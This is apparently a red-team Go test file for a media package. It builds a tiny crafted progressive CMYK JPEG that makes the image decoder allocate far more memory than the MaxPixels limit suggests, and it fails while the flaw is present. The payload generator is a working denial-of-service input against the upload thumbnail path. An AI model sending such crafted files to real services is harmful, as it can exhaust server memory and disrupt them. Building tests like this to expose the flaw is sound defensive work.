package media

// Red-team proof of concept (not a product test). TestRedteam* FAILs while
// the issue it describes is present.

import (
	"bytes"
	"testing"
)

// progressiveFlatJPEG builds a progressive (SOF2) 4-component (Adobe CMYK)
// JPEG of w x h whose single scan is a DC-first scan with every coefficient
// coded as one 0 bit. It is tiny on disk (about w*h/16 bytes) but forces
// image/jpeg to allocate a full progressive coefficient buffer.
func progressiveFlatJPEG(w, h int) []byte {
	seg := func(m byte, p []byte) []byte {
		return append([]byte{0xff, m, byte((len(p) + 2) >> 8), byte(len(p) + 2)}, p...)
	}
	b := []byte{0xff, 0xd8}
	b = append(b, seg(0xee, []byte("Adobe\x00\x64\x00\x00\x00\x00\x00"))...) // APP14, transform 0 -> CMYK
	dqt := append([]byte{0x00}, bytes.Repeat([]byte{1}, 64)...)
	b = append(b, seg(0xdb, dqt)...)
	sof := []byte{8, byte(h >> 8), byte(h), byte(w >> 8), byte(w), 4}
	for c := byte(1); c <= 4; c++ {
		sof = append(sof, c, 0x11, 0)
	}
	b = append(b, seg(0xc2, sof)...)
	dht := append([]byte{0x00, 1}, make([]byte, 15)...) // DC table 0: one 1-bit code...
	dht = append(dht, 0x00)                             // ...for category 0 (difference 0)
	b = append(b, seg(0xc4, dht)...)
	sos := []byte{4}
	for c := byte(1); c <= 4; c++ {
		sos = append(sos, c, 0x00)
	}
	sos = append(sos, 0, 0, 0) // Ss=0, Se=0, Ah=Al=0: DC first scan
	b = append(b, seg(0xda, sos)...)
	mcus := ((w + 7) / 8) * ((h + 7) / 8)
	b = append(b, make([]byte, (mcus*4+7)/8)...)
	return append(b, 0xff, 0xd9)
}

// TestRedteamProgressiveJPEGMemory: docs/media.md presents MaxPixels as the
// memory bound ("a 100 MP RGBA decode needs about 400 MB"). For a
// progressive CMYK JPEG, image/jpeg additionally keeps a full coefficient
// plane ([64]int32 per 8x8 block per component = 16 bytes/pixel for 4
// components) on top of the decoded image, and this runs synchronously in
// the upload request (mediajobs.OnCreate -> Thumbnail). The file is tiny.
func TestRedteamProgressiveJPEGMemory(t *testing.T) {
	const w, h = 4000, 4000
	data := progressiveFlatJPEG(w, h)
	path := putFile(t, "p.jpg", data)
	typ := sniffPath(t, path)
	if typ.MIME != "image/jpeg" {
		t.Fatalf("sniffed %q, want image/jpeg", typ.MIME)
	}
	r := NewImageRunner(Config{}) // default MaxPixels 1e8; 16M px is well under it
	var err error
	alloc, d := allocDuring(func() { _, err = r.Thumbnail(testCtx(t), path, typ, &bytes.Buffer{}) })
	perPx := float64(alloc) / float64(w*h)
	t.Logf("file %d bytes, %dx%d: err=%v, allocated %d MiB (%.1f bytes/pixel) in %s; extrapolated to the 100 MP cap: ~%.1f GB per decode, x MaxParallel",
		len(data), w, h, err, alloc>>20, perPx, d, perPx*1e8/1e9)
	if perPx > 8 {
		t.Errorf("allocated %.1f bytes/pixel; MaxPixels does not bound this, a sub-MB file near the cap exhausts memory", perPx)
	}
}
